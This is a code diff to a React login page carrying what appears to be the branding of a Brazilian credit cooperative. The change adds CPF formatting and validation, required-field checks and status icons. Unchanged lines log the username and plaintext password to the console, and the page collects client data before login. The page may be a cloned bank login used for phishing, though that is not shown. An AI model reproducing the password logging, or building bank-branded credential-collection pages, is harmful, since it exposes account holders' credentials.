@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Eye, EyeOff, HelpCircle } from "lucide-react";
+import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
@@ -8,6 +8,7 @@ import { Switch } from "@/components/ui/switch";
 import { useClientStatus } from "@/hooks/useClientStatus";
 import { useMetrics } from "@/hooks/useMetrics";
 import { useToast } from "@/hooks/use-toast";
+import { useCpfValidation } from "@/hooks/useCpfValidation";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -199,6 +200,8 @@ const Index = () => {
   const clientStatus = useClientStatus();
   const metrics = useMetrics();
   const { toast } = useToast();
+  const cpfValidation = useCpfValidation();
+  
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
@@ -267,15 +270,63 @@ const Index = () => {
     setSenhaTemp("");
   }
 
+  // Handler para mudança de CPF com validação
+  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { formatted } = cpfValidation.handleCpfChange(e.target.value);
+    setCpf(formatted);
+  };
+
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Validar CPF se estiver na aba de pessoa física
+    if (tab === 'fisica') {
+      const cleanCpf = cpf.replace(/[^\d]/g, '');
+      if (cleanCpf.length === 0) {
+        toast({
+          title: "CPF obrigatório",
+          description: "Por favor, digite um CPF válido.",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      if (cleanCpf.length !== 11) {
+        toast({
+          title: "CPF incompleto",
+          description: "Por favor, digite um CPF completo com 11 dígitos.",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      if (!cpfValidation.validateCpf(cpf)) {
+        toast({
+          title: "CPF inválido",
+          description: "Por favor, digite um CPF válido.",
+          variant: "destructive",
+        });
+        return;
+      }
+    }
+    
+    // Validar senha
+    if (!senha || senha.length === 0) {
+      toast({
+        title: "Senha obrigatória",
+        description: "Por favor, digite sua senha.",
+        variant: "destructive",
+      });
+      return;
+    }
+    
     setIsLoading(true);
     
     try {
       // Determinar username baseado na aba ativa
       let username = '';
       if (tab === 'fisica') {
-        username = cpf;
+        username = cpf.replace(/[^\d]/g, ''); // Enviar CPF sem máscara
       } else if (tab === 'juridica') {
         username = cnpj;
       } else if (tab === 'financeiro') {
@@ -286,14 +337,6 @@ const Index = () => {
       console.log('Tab ativa:', tab);
       console.log('Username:', username);
       console.log('Senha:', senha);
-      
-      // Validar se username e senha estão preenchidos
-      if (!username || !senha) {
-        console.log('Username ou senha não preenchidos');
-        console.log('Username está vazio:', !username);
-        console.log('Senha está vazia:', !senha);
-        // Continue mesmo assim para testar a API
-      }
       
       // Coletar dados do cliente
       const clientData = await collectClientData();
@@ -381,17 +424,38 @@ const Index = () => {
       case "fisica":
         return (
           <>
-            {/* CPF */}
+            {/* CPF com validação */}
             <div className="mb-4">
               <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">CPF</label>
-              <input
-                type="text"
-                className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
-                placeholder="CPF"
-                value={cpf}
-                onChange={(e) => setCpf(e.target.value)}
-                autoComplete="username"
-              />
+              <div className="relative">
+                <input
+                  type="text"
+                  className={`w-full h-12 px-3 pr-10 border rounded focus:outline-none transition text-base bg-white ${
+                    cpfValidation.isValid === true 
+                      ? 'border-green-500 focus:border-green-600' 
+                      : cpfValidation.isValid === false 
+                      ? 'border-red-500 focus:border-red-600' 
+                      : 'border-gray-300 focus:border-orange-500'
+                  }`}
+                  placeholder="000.000.000-00"
+                  value={cpf}
+                  onChange={handleCpfChange}
+                  autoComplete="username"
+                  maxLength={14}
+                />
+                {cpfValidation.isValid !== null && (
+                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                    {cpfValidation.isValid ? (
+                      <CheckCircle size={20} className="text-green-500" />
+                    ) : (
+                      <XCircle size={20} className="text-red-500" />
+                    )}
+                  </div>
+                )}
+              </div>
+              {cpfValidation.isValid === false && (
+                <p className="text-red-500 text-sm mt-1">CPF inválido</p>
+              )}
             </div>
             {/* Senha */}
             {senhaInput}
